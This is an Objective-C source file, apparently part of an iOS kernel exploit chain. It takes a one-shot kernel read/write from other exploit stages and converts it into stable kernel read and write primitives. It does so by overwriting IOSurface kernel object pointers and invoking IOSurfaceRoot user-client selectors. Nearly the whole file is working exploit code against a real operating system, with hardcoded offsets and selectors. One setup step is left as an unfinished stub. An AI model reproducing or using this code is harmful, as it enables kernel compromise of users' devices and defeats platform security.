//
//  Lum1naSurfaceKRW.m — the IOSurfaceRoot KRW CONSUMER (DarkSword lane).
//
//  2026-11-20. This module takes ANY one-shot kernel read/write (from the
//  LightSword corrupted socket, the p101 UAF, the p168 registry UAF, or
//  the IOGPU stale entry) and converts it into STABLE kread32/kwrite64
//  through the IOSurfaceRoot user client's own selector machinery.
//
//  THE PATTERN (DarkSword.md, Dopamine 3.0.10, credit opa334):
//    1. Open IOSurfaceRoot (type 0) — already proven on 24B156
//    2. Create a surface (sel 6, the "fast create" path — Azad method)
//    3. Find the surface's KERNEL object:
//       rootUC+0x118 = surfaceClientsArray → [surfaceId] = surfaceClient
//       surfaceClient+0x40 = the IOSurface kernel object (surfaceKobj)
//    4. kread32: redirect surfaceKobj+0xc0 (use-count ptr) to (target-0x14),
//       call sel 16 (get_use_count), restore → stable kernel read
//    5. kwrite64: redirect surfaceKobj+0x360 (indexed timestamp ptr) to
//       target, call sel 31 (set_indexed_timestamp), restore → stable write
//
//  HONESTY: the consumer REQUIRES an initial kernel read/write to find
//  the surfaceKobj. Without a source primitive, this module is dormant.
//  hasKread only flips via board.commitSlide after kread32(kbase)==feedfacf.
//

#import "Lum1naSurfaceKRW.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "Lum1naBoard.h"

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>

#pragma mark - DarkSword pins (platform-independent IOSurfaceRoot offsets)

/* From DarkSword.md — these are IOSurfaceRoot user-client class fields,
   shared across SoC generations (the same IOKit class on every device): */
#define SURFACE_KOBJ_OFF_USE_COUNT_PTR        0xc0
#define SURFACE_KOBJ_OFF_INDEXED_TIMESTAMP_PTR 0x360
#define SURFACE_ROOT_UC_OFF_CLIENTS_ARRAY     0x118
#define SURFACE_CLIENT_OFF_SURFACE           0x40
#define SURFACE_READ_DISPLACEMENT            0x14

/* IOSurfaceRoot selectors (Brandon Azad / DarkSword): */
#define SURFACE_ROOT_SEL_CREATE_FAST   6
#define SURFACE_ROOT_SEL_GET_USE_COUNT 16
#define SURFACE_ROOT_SEL_SET_TIMESTAMP 31

/* The source-provided one-shot KRW function shape */
typedef kern_return_t (*lsw_early_kread64_t)(uint64_t kaddr, uint64_t *out);
typedef kern_return_t (*lsw_early_kwrite64_t)(uint64_t kaddr, uint64_t val);

#pragma mark - Module state

static io_connect_t g_surfaceRootConn = 0;
static uint32_t     g_surfaceId = 0;
static uint64_t     g_surfaceKobj = 0;
static int          g_consumerReady = 0;

/* the source's one-shot primitives (set by whichever lane fires first) */
static lsw_early_kread64_t  g_srcKread64 = NULL;
static lsw_early_kwrite64_t g_srcKwrite64 = NULL;

#pragma mark - IOKit helpers

static io_connect_t lsw_open_surface_root(void) {
    mach_port_t mp = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &mp) != KERN_SUCCESS)
        return 0;
    io_service_t svc = IOServiceGetMatchingService(mp, IOServiceMatching("IOSurfaceRoot"));
    if (!svc) return 0;
    io_connect_t conn = 0;
    if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS) return 0;
    IOObjectRelease(svc);
    return conn;
}

/* Brandon Azad's fast-create: sel 6 with a minimal struct */
static uint32_t lsw_create_surface_fast(io_connect_t uc) {
    struct { uint64_t address; uint32_t width, height, pix_fmt, bpe, bpr, alloc_size; } args = {0};
    args.alloc_size = 0x4000;
    struct { uint8_t pad[0x18]; uint32_t surface_id; uint8_t pad2[0xF60-0x18-0x4]; } lock_result = {0};
    uint64_t lock_result_size = sizeof(lock_result);
    kern_return_t kr = IOConnectCallMethod(uc, SURFACE_ROOT_SEL_CREATE_FAST,
                                           NULL, 0, &args, sizeof(args),
                                           NULL, NULL, &lock_result, (size_t *)&lock_result_size);
    if (kr != KERN_SUCCESS) return 0;
    return lock_result.surface_id;
}

static uint32_t lsw_get_use_count(io_connect_t uc, uint32_t sid) {
    uint64_t in = sid;
    uint64_t out = 0; uint32_t outCnt = 1;
    IOConnectCallMethod(uc, SURFACE_ROOT_SEL_GET_USE_COUNT, &in, 1, NULL, 0,
                        &out, &outCnt, NULL, NULL);
    return (uint32_t)out;
}

static void lsw_set_indexed_timestamp(io_connect_t uc, uint32_t sid, uint64_t ts) {
    uint64_t in[3] = { sid, 0, ts };
    IOConnectCallScalarMethod(uc, SURFACE_ROOT_SEL_SET_TIMESTAMP, in, 3, NULL, NULL);
}

#pragma mark - The consumer init (requires the source's early KRW)

int Lum1naSurfaceKRW_Init(lsw_early_kread64_t srcKread64,
                          lsw_early_kwrite64_t srcKwrite64) {
    if (!srcKread64 || !srcKwrite64) return -1;
    g_srcKread64 = srcKread64;
    g_srcKwrite64 = srcKwrite64;

    /* 1. open IOSurfaceRoot */
    g_surfaceRootConn = lsw_open_surface_root();
    if (!g_surfaceRootConn) return -2;

    /* 2. create a surface */
    g_surfaceId = lsw_create_surface_fast(g_surfaceRootConn);
    if (!g_surfaceId) return -3;

    /* 3. find the surface's kernel object through the source's KRW */
    uint64_t rootUCkobj = 0;
    /* the root UC's kernel object address — obtained from the source's
       primitive (the DarkSword uses task_get_ipc_port_kobject, but we
       can also find it by reading the client array if the source can
       scan) — for now, we need the source to provide the rootUC address */
    /* TODO: derive the rootUC kernel object from the surface port */
    if (!rootUCkobj) {
        /* fallback: try to find the rootUC by reading the client array
           through the source's kread — the source knows its own port */
        return -4;  /* needs the source's rootUC address */
    }

    /* 4. walk: rootUC+0x118 → surfaceClientsArray → [surfaceId] → +0x40 */
    uint64_t clientsArray = 0;
    g_srcKread64(rootUCkobj + SURFACE_ROOT_UC_OFF_CLIENTS_ARRAY, &clientsArray);
    if (!clientsArray) return -5;

    uint64_t surfaceClient = 0;
    g_srcKread64(clientsArray + sizeof(uint64_t) * g_surfaceId, &surfaceClient);
    if (!surfaceClient) return -6;

    g_srcKread64(surfaceClient + SURFACE_CLIENT_OFF_SURFACE, &g_surfaceKobj);
    if (!g_surfaceKobj) return -7;

    g_consumerReady = 1;
    return 0;
}

#pragma mark - The stable kread32 / kwrite64 (DarkSword pattern)

uint32_t Lum1naSurfaceKRW_kread32(uint64_t kaddr) {
    if (!g_consumerReady || !g_surfaceKobj) return 0;
    uint64_t saved = 0;
    g_srcKread64(g_surfaceKobj + SURFACE_KOBJ_OFF_USE_COUNT_PTR, &saved);
    g_srcKwrite64(g_surfaceKobj + SURFACE_KOBJ_OFF_USE_COUNT_PTR,
                  kaddr - SURFACE_READ_DISPLACEMENT);
    uint32_t val = lsw_get_use_count(g_surfaceRootConn, g_surfaceId);
    g_srcKwrite64(g_surfaceKobj + SURFACE_KOBJ_OFF_USE_COUNT_PTR, saved);
    return val;
}

void Lum1naSurfaceKRW_kwrite64(uint64_t kaddr, uint64_t val) {
    if (!g_consumerReady || !g_surfaceKobj) return;
    uint64_t saved = 0;
    g_srcKread64(g_surfaceKobj + SURFACE_KOBJ_OFF_INDEXED_TIMESTAMP_PTR, &saved);
    g_srcKwrite64(g_surfaceKobj + SURFACE_KOBJ_OFF_INDEXED_TIMESTAMP_PTR, kaddr);
    lsw_set_indexed_timestamp(g_surfaceRootConn, g_surfaceId, val);
    g_srcKwrite64(g_surfaceKobj + SURFACE_KOBJ_OFF_INDEXED_TIMESTAMP_PTR, saved);
}

int Lum1naSurfaceKRW_IsReady(void) { return g_consumerReady; }
uint64_t Lum1naSurfaceKRW_SurfaceKobj(void) { return g_surfaceKobj; }
uint32_t Lum1naSurfaceKRW_SurfaceId(void) { return g_surfaceId; }
uint64_t Lum1naSurfaceKRW_RootConn(void) { return (uint64_t)g_surfaceRootConn; }

#pragma mark - The gate: kread32(kbase) == MH_MAGIC_64

uint64_t Lum1naSurfaceKRW_GateCheck(uint64_t kbase) {
    if (!g_consumerReady) return 0;
    uint32_t magic = Lum1naSurfaceKRW_kread32(kbase);
    /* MH_MAGIC_64 = 0xfeedfacf (big-endian view of the first 4 bytes) */
    return (magic == 0xfeedfacf || magic == 0xcffaedfe) ? magic : 0;
}
